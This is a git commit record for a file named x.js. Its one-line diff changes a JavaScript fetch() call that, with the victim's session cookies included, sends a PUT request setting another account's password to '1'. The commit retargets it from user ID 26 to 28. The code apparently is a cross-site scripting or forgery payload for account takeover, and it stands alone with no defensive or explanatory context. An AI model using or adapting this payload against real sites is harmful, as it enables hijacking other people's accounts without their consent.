be491fcb8f5c97e751bd6363b5e8ecea3be54237
Gerjan <gerjan@cybercloud.cc>
2025-06-03 17:24:21 +0200

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('/api/users/26',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"password":"1"}'})
+fetch('/api/users/28',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"password":"1"}'})
